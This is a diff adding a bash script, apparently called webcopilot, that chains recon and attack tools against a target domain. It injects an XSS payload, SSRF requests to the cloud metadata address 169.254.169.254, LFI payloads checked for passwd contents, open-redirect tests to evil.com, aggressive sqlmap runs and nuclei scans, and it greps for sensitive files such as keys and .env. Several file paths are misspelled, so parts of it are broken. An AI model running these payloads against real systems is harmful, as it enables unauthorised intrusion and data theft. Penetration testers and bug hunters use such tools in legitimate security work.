@@ -1,0 +1,389 @@
+#!/bin/bash
+# Coded by: Harshit Raj Singh aKa G!2m0 @h4r5h1t.hrs
+# Inspired by: @ROX4R works
+# Credits: @ROX4R
+
+#Colors Output
+NORMAL="\e[0m"			
+RED="\033[0;31m" 		
+GREEN="\033[0;32m"		   
+BOLD="\033[01;01m"    	
+WHITE="\033[1;37m"		
+YELLOW="\033[1;33m"	
+LRED="\033[1;31m"		
+LGREEN="\033[1;32m"		
+LBLUE="\033[1;34m"			
+LCYAN="\033[1;36m"		
+SORANGE="\033[0;33m"		      		
+DGRAY="\033[1;30m"		
+DSPACE="  "
+DTAB="\t\t"
+TSPACE="   "
+TTAB="\t\t\t"
+QSPACE="    "
+QTAB="\t\t\t\t"
+BLINK="\e[5m"
+TICK="\u2714"
+CROSS="\u274c"
+
+# Check if the script is run as root. If not, then exit.
+if [ "$(id -u)" != "0" ]; then
+    echo -e "${YELLOW}[!] ${LRED}${BOLD}This script must be run as root${NORMAL}" 1>&2
+    exit 1
+fi
+
+
+#variable
+domain=
+output=
+excl=
+threads=
+bServer=
+onlysub=
+
+#Banner 
+banner(){
+clear
+echo -e "\n${BOLD}${LRED}                     
+                                ──────▄▀▄─────▄▀▄
+                                ─────▄█░░▀▀▀▀▀░░█▄
+                                ─▄▄──█░░░░░░░░░░░█──▄▄
+                                █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█
+ ██╗░░░░░░░██╗███████╗██████╗░░█████╗░░█████╗░██████╗░██╗██╗░░░░░░█████╗░████████╗
+░██║░░██╗░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██║░░░░░██╔══██╗╚══██╔══╝
+░╚██╗████╗██╔╝█████╗░░██████╦╝██║░░╚═╝██║░░██║██████╔╝██║██║░░░░░██║░░██║░░░██║░░░
+░░████╔═████║░██╔══╝░░██╔══██╗██║░░██╗██║░░██║██╔═══╝░██║██║░░░░░██║░░██║░░░██║░░░
+░░╚██╔╝░╚██╔╝░███████╗██████╦╝╚█████╔╝╚█████╔╝██║░░░░░██║███████╗╚█████╔╝░░░██║░░░
+░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░"
+echo -e "${NORMAL}${BOLD}${QTAB}${DTAB}${QSPACE}  [●] ${BLINK}${LGREEN}@h4r5h1t.hrs${DGRAY} | ${LGREEN}G!2m0${NORMAL}\n"    
+
+echo -e "${NORMAL}\n[${CROSS}] ${NORMAL}Warning: Use with caution. You are responsible for your own actions.${NORMAL}"
+echo -e "${NORMAL}[${CROSS}] ${NORMAL}Developers assume no liability and are not responsible for any misuse or damage cause by this tool.${NORMAL}\n"
+}
+
+
+usage() {
+    echo -e "\n${RED}${BOLD}Usage:${NORMAL}"
+    echo -e "${DGRAY}webcopilot -d <target>"
+    echo -e "${DGRAY}webcopilot -d <target> -s"
+    echo -e "${DGRAY}webcopilot [-d target] [-o output destination] [-t threads] [-b blind server URL] [-x exclude domains]\n"
+    echo -e "${LRED}${BOLD}Flags:${NORMAL}"
+    echo -e "  -d        Add your target [Requried]"
+    echo -e "  -o        To save outputs in folder [Default: domain.com]"
+    echo -e "  -t        Number of threads [Default: 100]"
+    echo -e "  -b        Add your server for BXSS [Default: False]"
+    echo -e "  -x        Exclude out of scope domains [Default: False]"
+    echo -e "  -s        Run only Subdomain Enumeration [Default: False]"
+    echo -e "  -h        Show this help message"
+    echo -e "\n${DGRAY}${BOLD}Example:${NORMAL}${GREEN}$0 ${NORMAL} -d ${YELLOW}domain.com${NORMAL} -o ${YELLOW}domain${NORMAL} -t ${YELLOW}333${NORMAL} -x ${YELLOW}exclude.txt${NORMAL} -b ${YELLOW}testServer.xss${NORMAL}"
+    echo -e "Use ${LBLUE}https://xsshunter.com/${NORMAL} or ${LBLUE}https://interact.projectdiscovery.io/${NORMAL} to get your server" #server for performing blind injections we can use burpcollabator too
+    exit 1
+}
+
+if [ $# -eq 0 ]; then
+    banner
+    usage
+    exit 1
+fi
+
+while getopts ":b:d:o:t:x:hs" arg; do
+    case "${arg}" in
+        d)
+            domain=${OPTARG} ;;
+
+        o)
+            output=${OPTARG} ;;
+
+        h | \?)
+            banner && usage ;;
+
+        t)
+            threads=${OPTARG} ;;
+
+        x)
+            excl=${OPTARG} ;;
+        
+        b)
+            bServer=${OPTARG} ;;
+        
+        s)
+            onlysub=True ;;
+    esac
+done
+# shift $((OPTIND -1))
+
+if [ -z "$domain" ]; then
+    echo -e "\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please enter your target${NORMAL}"
+    usage
+fi
+
+if [ -z "$output" ]
+    then
+    output=${domain#*://}
+fi
+
+if [ -z "$threads" ]
+    then
+    threads=100
+fi
+
+mkdir -p $output
+cd $output/
+
+info() {
+    echo -e "${NORMAL}${WHITE}\nTarget:  ${RED}$domain${NORMAL}"
+    echo -e "${NORMAL}${WHITE}Output:  ${GREEN}$(pwd)${NORMAL}"
+    echo -e "${NORMAL}${WHITE}Threads: ${GREEN}$threads${NORMAL}"
+    if [ -z "$bServer" ];then echo -e "${NORMAL}${WHITE}Server:  ${LRED}False${NORMAL}"; else echo -e "${NORMAL}${WHITE}Server:  ${LBLUE}$bServer${NORMAL}"; fi
+    if [ -z "$excl" ];then echo -e "${NORMAL}${WHITE}Exclude: ${LRED}False${NORMAL}"; else echo -e "${NORMAL}${WHITE}Exclude: ${GREEN}$excl${NORMAL}"; fi
+    if [ -z "$onlysub" ];then echo -e "${NORMAL}${WHITE}Mode: ${GREEN}${TSPACE}Running all Enumeration${NORMAL}"; else echo -e "${NORMAL}${WHITE}Mode: ${GREEN}${TSPACE}Subdomain Enumeration${NORMAL}"; fi
+    echo -e "${NORMAL}${WHITE}Time: ${DGRAY}${TSPACE}$(date "+%d-%m-%Y %H:%M:%S")${NORMAL}"
+    echo -e "\n${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please wait while scanning...${NORMAL}"
+    # echo -e "${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} This may take a while...${NORMAL}"
+}
+
+subenum() {
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdoamin Scanning  -  ${NORMAL}[${RED}${BLINK}assetfinder${NORMAL}]"
+    assetfinder --subs-only $domain | sort -u | anew -q temp/assetfinder.txt
+    echo -e "\033[2A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdoamin Scanned  -  ${NORMAL}[${GREEN}assetfinder${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat temp/assetfinder.txt 2> /dev/null | wc -l )"
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdoamin Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]"
+    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -t $threads -o temp/sublister.txt &> /dev/null
+    echo -e "\033[2A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdoamin Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/sublister.txt 2> /dev/null | wc -l )"
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdoamin Scanning  -  ${NORMAL}[${LRED}${BLINK}subfinder${NORMAL}]"
+    subfinder -silent -d $domain -all -t $threads -o temp/subfinder.txt &> /dev/null
+    echo -e "\033[2A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdoamin Scanned  -  ${NORMAL}[${GREEN}subfinder${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/subfinder.txt 2> /dev/null | wc -l )"
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdoamin Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]"
+    amass enum -passive -norecursive -noalts -d $domain -o temp/amass.txt &> /dev/null
+    echo -e "\033[2A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdoamin Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/amass.txt 2> /dev/null | wc -l )"
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdoamin Scanning  -  ${NORMAL}[${LRED}${BLINK}findomain${NORMAL}]"
+    findomain -r -q -t $domain | anew -q temp/findomain.txt &> /dev/null
+    echo -e "\033[2A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdoamin Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/findomain.txt 2> /dev/null | wc -l )\n"
+    curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" | cut -d ',' -f1 | anew -q temp/hackertarget.txt &> /dev/null
+    curl -s "https://riddler.io/search/exportcsv?q=pld:$domain" | cut -d ',' -f6 | sed 's/Keywords//' | sed '/^$/d' | anew -q temp/riddler.txt &> /dev/null
+    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | anew -q temp/crtsh.txt &> /dev/null
+}
+
+active_subenum() {
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Active Subdoamin Scanning is in progress:${NORMAL}\n"
+    echo -e "${NORMAL}${WHITE}${BOLD}${LRED} [!]${NORMAL}${WHITE}${BOLD}${LRED} Please be patient. This may take a while...${NORMAL}"
+    echo -ne "${NORMAL}${BOLD}${YELLOW}[●] Active Subdoamin Scanning  -  ${NORMAL}[${RED}${BLINK}fuzz${NORMAL}]"
+    ffuf -u http://FUZZ.$domain/ -t 200 -p 1.0-2.0 -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200,403 -r -o temp/ffuf.json -s &> /dev/null
+    cat temps/ffuf.json | jq -r '.results[] | {status:.status, host:.host} | .host' 2> /dev/null | anew -q temp/active_ffuf.txt
+    echo -e "\033[1A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Active Subdoamin Scanned  -  ${NORMAL}[${GREEN}ffuf${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat temp/atffuf.txt 2> /dev/null | wc -l )"
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Active Subdoamin Scanning  -  ${NORMAL}[${RED}${BLINK}amass${NORMAL}]"
+    timeout 22m amass enum -active -brute -w ~/wordlists/subdomains.txt -d $domain -o temp/active_amass.txt &> /dev/null
+    echo -e "\033[2A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Active Subdoamin Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat temp/atamass.txt 2> /dev/null | wc -l )\n"
+    cat temp/*.txt | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$domain" | anew -q subdomains/domains.txt
+}
+    
+subfiltering() {    
+    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Scanning:${NORMAL}${BOLD} Filtering out of scope subdomains\r"
+    sleep 1s
+    if [ -f "$excl" ]
+        then 
+            cat subdomains/domains.txt | grep -vf $exclude | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -retry 2 -r ~/wordlists/resolvers.txt  -t $threads -silent | anew -q subdomains/subdomains.txt
+        else
+            cat subdomains/domains.txt | sort -u | sed '/@\|<BR>\|\_\|*/d'  | dnsx -retry 2 -r ~/wordlists/resolvers.txt  -t $threads -silent | anew -q subdomains/subdomains.txt
+    fi
+    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Scanning:${NORMAL}${BOLD} Filtering Alive subdomains\r"
+    cat subdomains/subdomains.txt | sort -u | uniq -u | httpx -threads $threads -tls-probe -csp-probe -silent -o subdomains/alivesub.txt &> /dev/null
+    cat subdomains/alivesub.txt | sed -E 's/^\s*.*:\/\///g' | anew -q subdomains/alwihouthttp.txt
+}
+ 
+title() {
+    mkdir -p subdomains/aquatone
+    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Scanning:${NORMAL}${BOLD} Getting titles of valid subdomains\r"
+    cat subdomains/alivesub.txt | httpx -threads $threads -status-code -title -silent  -timeout 20 -retries 2 -follow-host-redirects -random-agent -no-color 2> /dev/null | anew -q subdomains/title.txt
+    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Visual inspection of Subdomains:${NORMAL} [${GREEN}${BLINK}Aquatone${NORMAL}]"
+    cat subdomains/alivesub.txt | aquatone -chrome-path /snap/bin/chromium -out subdomains/aquatone/ -threads 10 -silent &> /dev/null
+    echo -e "\033[1A"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Visual inspection of Subdoamins is completed. ${NORMAL}\t Check: ${GREEN}$(echo '/subdomains/aquatone/' 2> /dev/null)"
+    echo -ne "${NORMAL}${BOLD}${LGREEN}\n[●] Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${WHITE}\t Total: ${GREEN}$(cat subdomains/subdomains.txt 2> /dev/null | wc -l )${WHITE} | Alive: ${GREEN}$(cat subdomains/alivesub.txt 2> /dev/null | wc -l )\n" 
+}
+
+
+parammine() {
+    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Getting all endpoints\r"
+    cat subdomains/alivesub.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o temp/gauplus.txt
+    cat subdomains/alivesub.txt | waybackurls | anew -q temp/waybackurls.txt
+    cat temp/gauplus.txt temp/waybackurls.txt 2> /dev/null | sed '/\[/d' | grep $domain | sort -u | urldedupe -s | anew -q subdomains/endpoints.txt
+}
+
+gfpt(){
+    echo -ne "${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Filtering all endpoints\r"
+    cat subdomains/endpoints.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/xss.txt
+    cat subdomains/endpoints.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/ssrf.txt
+    cat subdomains/endpoints.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/sqli.txt
+    cat subdomains/endpoints.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/lfi.txt
+    cat subdomains/endpoints.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/rce.txt
+    cat subdomains/endpoints.txt | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/openredirect.txt 
+    echo -ne "${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${RED}${WHITE}\t Total: ${GREEN}$(cat subdomains/endpoints.txt 2> /dev/null | wc -l )"
+    sleep 2s
+}
+
+xss() {
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}XSS${NORMAL}]\r"
+    sleep 2s
+    xargs -a patterns/xss.txt -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >\|\"" | cut -d ' ' -f2 | anew -q vulnerabilities/check_xss.txt
+    cat patterns/xss.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[${RED}POTENTIAL XSS${NORMAL}] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q vulnerabilities/xss.txt &> /dev/null
+    if [ -n "$bServer" ]
+        then
+            cat patterns/xss.txt | dalfox pipe --silence --no-color --no-spinner --skip-bav --mass --mass-worker $threads -w $threads -b $bServer -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew -q vulnerabilities/xss_dalfox.txt &> /dev/null
+        else
+            cat patterns/xss.txt | dalfox pipe --silence --no-color --no-spinner --skip-bav --mass --mass-worker $threads -w $threads -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew -q vulnerabilities/xss_dalfox.txt &> /dev/null
+    fi
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}XSS${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/xss.txt 2> /dev/null | wc -l )"
+}
+
+sqli() {
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SQLi${NORMAL}]\r"
+    cat patterns/sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=vulnerabilities/sqlmap 2> /dev/null" &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}SQLi${TICK}${NORMAL}]${DTAB} Found: ${GREEN}$(cat vulnerabilities/sqlmap/*.txt 2> /dev/null | wc -l )"
+}
+
+lfi() {
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}LFI${NORMAL}]\r"
+    cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat patterns/lfi.txt | qsreplace % " 2> /dev/null | anew -q temp/lfi.txt
+    xargs -a tem/lfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q vulnerabilities/lfi.txt 
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}LFI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/lfi.txt 2> /dev/null | wc -l )"
+}
+
+crlf() {
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}CRLF${NORMAL}]\r"
+    crlfuzz -l subdomains/alivesub.txt -c $threads -s | anew vulnerabilities/crlf.txt &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}CRLF${TICK}${NORMAL}]${DTAB} Found: ${GREEN}$(cat vulnerabilities/crlf.txt 2> /dev/null | wc -l )"
+}
+
+sensitive(){
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Sensitive Data${NORMAL}]\r"
+    cat patterns/sensitive.txt | cut -d"?" -f1 | cut -d"=" -f1 | anew -q vulnerabilities/check_sensitive.txt
+    cat checkSensitive.txt | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | anew -q vulnerabilities/sensitivefile.txt
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Sensitive Data${TICK}${NORMAL}]\t Found: ${GREEN}$(cat vulnerabilities/sensitivefile.txt 2> /dev/null | wc -l )"
+}
+
+takeover(){
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Subdomain Takeover${NORMAL}]\r"
+    # xargs -a subdomains/subdomains.txt -P 50 -I % bash -c "dig % | grep CNAME"
+    # cat cnam | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe -threads $threads -fc 200,301,502,503
+    subjack -w subdomains/subdomains.txt -t ${threads} -a -o vulnerabilities/takeover.txt
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Subdomain Takeover${TICK}${NORMAL}]\t Found: ${GREEN}$(cat vulnerabilities/takeover.txt 2> /dev/null | wc -l )"
+}
+
+openredirect(){
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Open Redirect${NORMAL}]\r"
+    cat patterns/openredirect | qsreplace "http://www.evil.com/" 2> /dev/null | anew -q temp/openredirect.txt
+    python3 ~/tools/OpenRedireX/openredirex.py -l temp/openredirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q vulnerabilities/openredireX.txt &> /dev/null
+    cat temp/opredirect.txt | xargs -P 50 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure -iL '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[${RED}POTENTIAL OPREDIRECT${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL OPREDIRECT" | anew vulnerabilities/openredirect.txt &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Open redirect${TICK}${NORMAL}]\t Found: ${GREEN}$(cat vulnerabilities/openredirect.txt 2> /dev/null | wc -l )"
+}
+
+ssrf(){
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SSRF${NORMAL}]\r"
+    cat domains/patterns/ssrf.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q temp/ssrf.txt
+    cat temp/ssrf.txt | xargs -P 55 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[${RED}POTENTIAL SSRF${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew vulnerabilities/ssrf.txt &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}SSRF${TICK}${NORMAL}]${DTAB} Found: ${GREEN}$(cat vulnerabilities/ssrf.txt 2> /dev/null | wc -l )"
+}
+
+nuclei(){
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Nuclei${NORMAL}]\r"
+    xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity info -c 50 -silent" 2> /dev/null | anew -q nuclei/info.txt
+    xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity low -c 50 -silent" 2> /dev/null | anew nuclei/low.txt 
+    xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity medium -c 50 -silent" 2> /dev/null | anew nuclei/medium.txt 
+    xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity high -c 50 -silent" 2> /dev/null | anew nuclei/high.txt 
+    xargs -a subdomains/alivesub.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity critical -c 50 -silent" 2> /dev/null | anew nuclei/critical.txt 
+    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Nuclie${TICK}${NORMAL}]${DTAB} Found: ${GREEN}$(cat nuclei/*.txt 2> /dev/null | wc -l )"
+}
+
+result() {
+    echo -e "${BOLD}${GREEN} 
+▒█▀▀█ █▀▀ █▀▀ █░░█ █░░ ▀▀█▀▀
+▒█▄▄▀ █▀▀ ▀▀█ █░░█ █░░ ░░█░░
+▒█░▒█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀▀▀ ░░▀░░\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains of ${RED}$domain${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Found:${NORMAL}${BOLD}${GREEN} $(cat subdoamins/subdomains.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Alive:${NORMAL}${BOLD}${GREEN} $(cat subdoamins/alivesub.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Endpoints:${NORMAL}${BOLD}${GREEN} $(cat subdomains/endpoints.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} XSS:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/xss_dalfox.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SQLi:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/sqlmap/*.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Open Redirect:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/openredirect.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSRF:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/ssrf.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} CRLF:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/crlf.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} LFI:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/lfi.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Sensitive Data:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/sensitivefile.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomain Takeover:${NORMAL}${BOLD}${GREEN} $(cat subdomains/takeover.txt 2> /dev/null | wc -l)${NORMAL}\n"
+    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Nuclei:${NORMAL}${BOLD}${GREEN} $(cat nuclie/*.txt 2> /dev/null | wc -l)${NORMAL}\n"
+}
+
+subScan(){
+    mkdir -p temp
+    mkdir -p subdomains
